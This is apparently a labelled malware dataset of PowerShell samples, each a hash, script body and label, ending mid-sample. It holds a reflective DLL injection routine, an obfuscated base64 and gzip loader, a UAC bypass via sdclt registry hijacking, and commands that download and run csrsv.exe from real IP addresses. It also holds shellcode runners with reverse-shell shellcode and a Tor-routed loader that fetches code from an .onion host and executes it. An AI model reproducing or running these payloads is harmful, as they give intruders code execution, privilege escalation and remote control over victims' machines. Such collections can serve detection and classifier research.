                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        
        Write-Verbose ""Calling dllmain so the DLL knows it is being unloaded""
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
        {
            Throw ""Can't supply a ProcId and ProcName, choose one or the other""
        }
        elseif ($ProcName -ne $null -and $ProcName -ne """")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw ""Can't find process $ProcName""
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        
        





        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw ""Couldn't obtain the handle for process ID: $ProcId""
            }
            
            Write-Verbose ""Got the handle for the remote process to inject in to""
        }
        

        
        Write-Verbose ""Calling Invoke-MemoryLoadLibrary""
        
        
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
            write-verbose ""64 Bit Injection""
        }
        else
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
            write-verbose ""32 Bit Injection""
        }
        
        
        
        
        $RawBytes = Invoke-PatchDll -DllBytes $RawBytes -FindString ""Invoke-Replace"" -ReplaceString $PoshCode
        $PEBytes = $RawBytes
        
        
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw ""Unable to load PE, handle returned is NULL""
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] 
        
        
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            
            
            
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose ""Calling function with WString return type""
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""WStringFunc""
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw ""Couldn't find function address.""
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose ""Calling function with String return type""
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""StringFunc""
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw ""Couldn't find function address.""
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose ""Calling function with Void return type""
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw ""Couldn't find function address.""
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            
            
            
        }
        
        elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw ""VoidFunc couldn't be found in the DLL""
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        
        
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq ""DLL"")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
            }
        }
        
        Write-Verbose ""Done!""
    }

    Main
}


Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
    {
        $DebugPreference  = ""Continue""
    }
    Write-Verbose ""PowerShell ProcessID: $PID""
    if ($ProcId)
    {
        Write-Verbose ""Remote Process: $ProcID""
    }

    
    
    $PEBytes64 = '
    $PEBytes32 = ''

    
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = ""ReflectiveExe $ExeArgs""
    }
    else
    {
        $ExeArgs = ""ReflectiveExe""
    }
    
    [System.IO.Directory]::SetCurrentDirectory($pwd)

    if ($ComputerName -eq $null -or $ComputerName -imatch ""^\s*$"")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode) -ComputerName $ComputerName
    }
}

Main
}
",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
3faa02273f44e19906cb95be4678e067f6e5862d40d87aa1f11116675432cf20,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIACSNllcCA71WbW/iOBD+3Er7H6IVUhId5b3ttdJKlwCBtKQLTYECi05u4iQGE1PHocDe/vebQNJStb3b2w8XFdWxZ+xnnnnGEy8OHUFYKM17zapp0aXndQzp+6fjoy7iaCEpOdSL4k3XWflCq+alHJ3dsP5aPToCk9xj3ApqkW9JXyRloi2XDbZAJJxeXtZjznEo9u+FFhZaFOHFAyU4UlTpL2kYYI5Pvj7MsCOk71Luz0KLsgdEU7NNHTkBlk600E3WOsxBCciCvaREKPK3b7I6OSlPC83HGNFIke1NJPCi4FIqq9IPNTnwbrPEimwRh7OIeaIwJGG1UuiHEfLwDey2whYWAXMjWYVI4I9jEfNQeo4p2WRvosgw7HLmaK7LcQQeBTNcsTlWcmFMaV76Q5mkCG7jUJAFhnWBOVvamK+Ig6NCG4UuxbfYmyo3+CkL/GedlEMnsOoKruYhNR9AtZgbU7z3ltW3YF+lVIXnJa3AxY9Px5+OvUwWwmweqgFGR5PdGANWpcsisjP7IpXykgUnIsH4Bl5zdzzG6lSaJHmYTKdSjgTsIvTM8/zHe5QzBzBfDc7OR37jgZVMWJkMGHGn4JkmK+c78eguWfhYdQ3skRA3NiFaECcTlvIe/9ijeBduITO7AXCKnC5gt4Ep9pFI2MxLk7duzQURz756TKiLueZADiNABelVX4PZJ0iRzdDCC+Br/y5DGjyQM86sUwlvstOTdzCS6xRFUV7qxlBPTl6yMaLYzUtaGJF0SYsF2w3lF7hWTAVxUCSy7abqM5HpgXUWRoLHDuQQgr+zl9ghiCZc5KU2cbG+sYmfHSy/y0QdUUpCH3ZaQSZgJmHAFokyOGB8VoFasLEwF0uKF2C3q26DIh9qOa2GnZyQj135DcxM6ntdJ4xkVByAhDTblIm8NCBcwC2RsHugqV+HcnBV7EHVOU6To2TlM9E3IlF9bnsfLy/K94lQU652zHABrBicLXQU4bOaLThwpnwufiV1DZ6RGVLL0eekrD2RsmnBr0+qJmucu9dXs3aRN9aBp5mRabW7jV67XVtd2YOasJumuO6awmrez2a21r7tj8TY1Np3pDQf1bbLK7K1O5o7WhfPtvr2qaSvtzPf9UYNz/PPPfu2fGqQzrDe00sV1Gk0485Qf9JLtahJnto90u/NrwzxMBpQ1PeK/n35ApF1h88GZWZtTU1rBVVne+UNWoHlbkbt4sWwNteamlYPmwNDZ9cjnWvd4qBv6L1+U+/1YO7ML3o1mKO/BUnYGg6D2Si8om71djuun87HrdNtZ3FKXU0fDY3gl35aiyyvG7YGeDo9ff2oD3Sm+VrYqIULFOjDQYWMl/e3AawbEKZVLNVMF6/Z750hGayKA+Trj7oxvkdaZ7wxisXyKKqgOeyhA2Bj/Ahxj5ZGl4L/Xb/CtAG9ebHttRvXzrh8HllfPifaAfHkBK8cyOGju99CPAoQBZnAhZ5VrMG4kV7MXUYSD0V51bfnmIeYQp+DTpgJX6OUOUm7SK5y6FT7/jGF6u3DsFp5d6RKz4bqSwfJpi4vxwAWSiiVd6GDQ18E+dK6WipBIyitayUI9+djrLPlRsl2yye9JKHp4AC6O0BNaiu3DU7b/w+DaWUH8M/9FwZf5v5h9adYLeV3sb+ZfT3xn+j9ZQKGiAjwsOF2onjfNN/lIRXNwbdGkiTQg5c+yTff11ic3MAnyN9CrE0ocwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
b125c11af10487ff717ea12075f3391acc0ae4f4271517c061fcd110daac33c3,"function Invoke-SDCLTBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like ""*S-1-5-32-544*"").length -eq 0) {
        ""[!] Current user not a local administrator!""
        Throw (""Current user not a local administrator!"")
    }
    if (($(whoami /groups) -like ""*S-1-16-8192*"").length -eq 0) {
        ""[!] Not in a medium integrity process!""
        Throw (""Not in a medium integrity process!"")
    }

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        ""UAC is set to 'Always Notify'. This module does not bypass this setting.""
        exit
    }
    else{
        
        
        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
        $parts = $RegPath.split('\');
        $path = $RegPath.split(""\"")[0..($parts.count -2)] -join '\';
        $name = $parts[-1];
        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;


        $exeCommandPath = ""HKCU:\Software\Classes\exefile\shell\runas\command""
        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x'

        if ($Force -or ((Get-ItemProperty -Path $exeCommandPath -Name 'IsolatedCommand' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $exeCommandPath -Force |
                New-ItemProperty -Name 'IsolatedCommand' -Value $launcherCommand -PropertyType string -Force | Out-Null
        }else{
            Write-Warning ""Key already exists, consider using -Force""
            exit
        }

        if (Test-Path $exeCommandPath) {
            Write-Verbose ""Created registry entries to hijack the exe runas extension""
        }else{
            Write-Warning ""Failed to create registry key, exiting""
            exit
        }

        $sdcltPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'sdclt.exe'
        if ($PSCmdlet.ShouldProcess($sdcltPath, 'Start process')) {
            $Process = Start-Process -FilePath $sdcltPath -ArgumentList '/kickoffelev' -PassThru
            Write-Verbose ""Started sdclt.exe""
        }

        
        Write-Verbose ""Sleeping 5 seconds to trigger payload""
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $exefilePath = ""HKCU:\Software\Classes\exefile""
				$PayloadPath = 'HKCU:Software\Microsoft\Windows'
				$PayloadKey = ""Update""

        if (Test-Path $exefilePath) {
            
            Remove-Item $exefilePath -Recurse -Force
						Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
            Write-Verbose ""Removed registry entries""
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose ""Killed running sdclt process""
        }
    }
}
",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
52adcbd4df6e860ca279cb0bc180cb3d67cf5f4c88de42a3569f16615919f865,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb0,0xe4,0x29,0x71,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
adeffa00d96e50a69bde640f9b4bca00be2ec8f4aa06a9827119ad857b45cd12,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
ee69427f5fcd414f6c97e8e361a37401b69943bc48fb61a598d601b048ae9499,"
'xneZtEDC';$ErrorActionPreference = 'SilentlyContinue';'uqaaPxuaCN';'DOBHbJqlkRM';$kn = (get-wmiobject Win32_ComputerSystemProduct).UUID;'WVy';'gKEZgPRMl';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $kn){;'mUzql';'jsvZDTQITNa';(Get-Process -id $pid).Kill();'NgpYRhj';'hVXjCtDvBc';};'tUVXQmXbZ';'lkTzhJZHwxU';'McPzodeY';'vNNYv';function e($dkez){;'TfPD';'WTw';$jt = (((iex ""nslookup -querytype=txt $dkez 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'HdCjwAD';'sVSjtZRvr';$ovg.DownloadFile($jt, $tg);'raVw';'OQNdBkS';$ei = $ke.NameSpace($tg).Items();'OgnucmQlK';'Qfqxov';$ke.NameSpace($sa).CopyHere($ei, 20);'GBMdJNr';'VMWS';rd $tg;'pnoFau';'SedloE';};'NxPZPIV';'ypi';'AFElBzCp';'bYRWML';'UYANxqtLg';'QBC';$sa = $env:APPDATA + '\' + $kn;'Eaxyty';'IwuaOh';if (!(Test-Path $sa)){;'amYmrKg';'vWAgqtEB';$qr = New-Item -ItemType Directory -Force -Path $sa;'GqNII';'HNPIQutUpGv';$qr.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'MuRuRa';'CmlkCszVCO';};'ZdmIGyj';'nAYhOpvWV';'BIAgIntvoU';'GJTBzyjr';$zul=$sa+ '\tor.exe';'swInqmX';'LTXwOFNSuL';$axs=$sa+ '\polipo.exe';'qkI';'WJPoaNnarn';$tg=$sa+'\'+$kn+'.zip';'Sgw';'fYthyZ';$ovg=New-Object System.Net.WebClient;'Ils';'GRldQfFnfQK';$ke=New-Object -C Shell.Application;'vVoutJQ';'gHXAsaxc';'llaetDv';'Zix';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'QtJINrwhS';'XkAxtKLAJ';e 'i.vankin.de';'QqVujkSIPS';'dZdn';};'GoemQSlIB';'IOcJU';'FYTMzpCupR';'qEnstu';if (!(Test-Path $zul) -or !(Test-Path $axs)){;'ZGtSt';'mHkBgIOsU';e 'gg.ibiz.cc';'sDtXmE';'xSBk';};'YaiaAJqKPin';'gFVK';'TumvJVvJKRm';'ULQwp';$pj=$sa+'\roaminglog';'numdmmhA';'ytEF';saps $zul -Ar "" --Log `""notice file $pj`"""" -wi Hidden;'JCBc';'CjHbOtf';do{sleep 1;$xxl=gc $pj}while(!($xxl -match 'Bootstrapped 100%: Done.'));'wYtpNVJtdz';'XggiQIPFt';saps $axs -a ""socksParentProxy=localhost:9050"" -wi Hidden;'dlV';'zVLSO';sleep 7;'FzlDdEynuUz';'Ci';$zpp=New-Object System.Net.WebProxy(""localhost:8123"");'MsOkmLs';'zRW';$zpp.useDefaultCredentials = $true;'PWXVXIMqb';'lAy';$ovg.proxy=$zpp;'gEkdkGPjVp';'xerooSjz';$ca='http://powerwormjqj42hu.onion/get.php?s=setup&mom=14C6EFBB-F19D-DC11-83A7-001B38A0DF85&uid=' + $kn;'SGCFq';'GkVVnp';while(!$qmh){$qmh=$ovg.downloadString($ca)};'rHo';'jtshvrR';if ($qmh -ne 'none'){;'Ju';'VuUTlp';iex $qmh;'blhE';'AeIepyNd';};'whSp';

",TaskExecution
d6e03248539aaed3fc2c22d091c8c8f0e13418e1f54a9333cfdc0c50f888f0a7,"
$y4T = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $y4T -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x51,0xd0,0x47,0x36,0xd9,0xee,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x6a,0x0f,0x03,0x6a,0x5e,0x32,0xb2,0xca,0x88,0x30,0x3d,0x33,0x48,0x55,0xb7,0xd6,0x79,0x55,0xa3,0x93,0x29,0x65,0xa7,0xf6,0xc5,0x0e,0xe5,0xe2,0x5e,0x62,0x22,0x04,0xd7,0xc9,0x14,0x2b,0xe8,0x62,0x64,0x2a,0x6a,0x79,0xb9,0x8c,0x53,0xb2,0xcc,0xcd,0x94,0xaf,0x3d,0x9f,0x4d,0xbb,0x90,0x30,0xfa,0xf1,0x28,0xba,0xb0,0x14,0x29,0x5f,0x00,0x16,0x18,0xce,0x1b,0x41,0xba,0xf0,0xc8,0xf9,0xf3,0xea,0x0d,0xc7,0x4a,0x80,0xe5,0xb3,0x4c,0x40,0x34,0x3b,0xe2,0xad,0xf9,0xce,0xfa,0xea,0x3d,0x31,0x89,0x02,0x3e,0xcc,0x8a,0xd0,0x3d,0x0a,0x1e,0xc3,0xe5,0xd9,0xb8,0x2f,0x14,0x0d,0x5e,0xbb,0x1a,0xfa,0x14,0xe3,0x3e,0xfd,0xf9,0x9f,0x3a,0x76,0xfc,0x4f,0xcb,0xcc,0xdb,0x4b,0x90,0x97,0x42,0xcd,0x7c,0x79,0x7a,0x0d,0xdf,0x26,0xde,0x45,0xcd,0x33,0x53,0x04,0x99,0xf0,0x5e,0xb7,0x59,0x9f,0xe9,0xc4,0x6b,0x00,0x42,0x43,0xc7,0xc9,0x4c,0x94,0x28,0xe0,0x29,0x0a,0xd7,0x0b,0x4a,0x02,0x13,0x5f,0x1a,0x3c,0xb2,0xe0,0xf1,0xbc,0x3b,0x35,0x6f,0xb8,0xab,0x76,0xd8,0xc3,0x2d,0x1f,0x1b,0xc4,0x31,0xb0,0x92,0x22,0x61,0x1e,0xf5,0xfa,0xc1,0xce,0xb5,0xaa,0xa9,0x04,0x3a,0x94,0xc9,0x26,0x90,0xbd,0x63,0xc9,0x4d,0x95,0x1b,0x70,0xd4,0x6